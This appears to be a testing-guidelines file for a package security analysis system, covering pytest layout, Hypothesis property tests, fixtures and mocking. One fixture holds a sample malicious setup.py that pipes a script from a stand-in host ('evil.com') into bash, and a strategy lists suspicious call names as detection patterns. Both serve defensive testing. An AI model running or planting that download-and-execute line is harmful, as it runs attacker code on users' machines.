---
inclusion: fileMatch
fileMatchPattern: "test_*.py|*_test.py"
---

# Testing Guidelines for Security Analysis System

## Test Organization

### File Naming
- Unit tests: `test_<module_name>.py`
- Property tests: `test_<feature>_properties.py`
- Integration tests: `test_end_to_end_<scenario>.py`

### Test Structure
```python
# tests/unit/test_cache_manager.py
import pytest
from tools.cache_manager import CacheManager

class TestCacheManager:
    """Test suite for CacheManager."""
    
    def test_cache_hit(self):
        """Test that cache returns stored values."""
        # Arrange
        cache = CacheManager()
        key = "test_key"
        value = {"result": "test"}
        
        # Act
        cache.store(key, value)
        result = cache.get(key)
        
        # Assert
        assert result == value
```

## Property-Based Testing with Hypothesis

### Property Test Format
```python
from hypothesis import given, strategies as st

@given(st.text(min_size=1))
def test_property_content_hash_consistency(script_content):
    """
    **Feature: production-ready-enhancements, Property 9: Content Hash Consistency**
    
    For any two identical script contents, cache key generation should 
    produce identical hash values.
    """
    cache = CacheManager()
    hash1 = cache.generate_key(script_content)
    hash2 = cache.generate_key(script_content)
    assert hash1 == hash2
```

### Property Test Requirements
1. **Tag with feature and property number** in docstring
2. **Run minimum 100 iterations** (configured in pytest.ini)
3. **Use appropriate strategies** for input generation
4. **Test universal properties**, not specific examples

### Common Strategies
```python
# Package names
st.text(alphabet=st.characters(whitelist_categories=('Ll', 'Lu', 'Nd')), min_size=1, max_size=50)

# Version strings
st.from_regex(r'^\d+\.\d+\.\d+$')

# File paths
st.from_regex(r'^[a-zA-Z0-9_/.-]+$')

# Malicious patterns
st.sampled_from(['os.system', 'subprocess.call', 'eval', 'exec'])
```

## Test Fixtures

### Location
- `tests/fixtures/npm/malicious/` - Malicious npm packages
- `tests/fixtures/npm/benign/` - Safe npm packages
- `tests/fixtures/python/malicious/` - Malicious Python packages
- `tests/fixtures/python/benign/` - Safe Python packages

### Creating Fixtures
```python
@pytest.fixture
def malicious_setup_py():
    """Fixture for malicious setup.py content."""
    return '''
from setuptools import setup
import os

# Malicious code
os.system("curl http://evil.com/steal.sh | bash")

setup(name="malicious-pkg", version="1.0.0")
'''
```

## Mocking Guidelines

### When to Mock
- External API calls (npm registry, PyPI, OSV)
- File system operations in unit tests
- LLM API calls (OpenAI)

### When NOT to Mock
- Internal function calls
- Data structures and models
- Cache operations (use in-memory backend)

### Mock Example
```python
from unittest.mock import patch, MagicMock

def test_reputation_with_api_failure():
    """Test reputation service handles API failures gracefully."""
    with patch('requests.get') as mock_get:
        mock_get.side_effect = requests.RequestException("API down")
        
        scorer = ReputationScorer()
        result = scorer.calculate_reputation("test-pkg", "npm")
        
        # Should return default low score
        assert result['score'] == 0.3
```

## Running Tests

### All Tests
```bash
pytest
```

### Specific Test Types
```bash
pytest -k "property"           # Property-based tests only
pytest -k "unit"               # Unit tests only
pytest tests/integration/      # Integration tests only
```

### With Coverage
```bash
pytest --cov=tools --cov=agents --cov-report=html
```

### Verbose Output
```bash
pytest -v --tb=short
```

## Test Quality Checklist

- [ ] Test has clear, descriptive name
- [ ] Test follows Arrange-Act-Assert pattern
- [ ] Test is independent (no shared state)
- [ ] Test uses appropriate fixtures
- [ ] Property tests have feature/property tags
- [ ] Mocks are used appropriately
- [ ] Edge cases are covered
- [ ] Error conditions are tested
- [ ] Test runs quickly (< 1 second for unit tests)
